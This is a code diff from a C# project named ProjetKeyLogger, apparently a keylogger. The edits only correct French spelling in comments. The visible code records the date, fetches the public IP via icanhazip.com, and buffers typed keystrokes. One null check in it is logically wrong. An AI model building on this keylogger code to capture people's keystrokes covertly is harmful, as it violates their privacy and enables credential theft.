@@ -50,7 +50,7 @@ namespace ProjetKeyLogger
             }
         }
 
-        //Renvoit la date et l'heure courrante
+        //Renvoie la date et l'heure courrante
         public void dateTimeNow()
         {
             //Date actuelle
@@ -64,23 +64,22 @@ namespace ProjetKeyLogger
             adresse_ip_publique =  new WebClient().DownloadString("http://icanhazip.com");
         }
 
-        //Fonction qui concatene la derniere touche tapé au clavier , au contenu de l'enregistrement
+        //Fonction qui concatene la derniere touche tapé au clavier, au contenu de l'enregistrement
         public void ajouterContenu(string caractere)
         {
             //Ajout du caracter au contenu du text
             contenu += caractere;
         }
 
-        //Fonction qui supprime le dernier caractere de la chaine
+        //Fonction qui supprime le dernier caractère de la chaine
         public void effacerContenu()
         {
             //Si la chaine n'est pas nulle et possède une longueur >0
             if(contenu.Length > 0 || contenu == null)
             {
-                //On conserve toute la chaine sauf le dernier caractere tapé
+                //On conserve toute la chaine sauf le dernier caractère tapé
                 contenu = contenu.Substring(0, contenu.Length - 1);
             }
         }
-
     }
 }
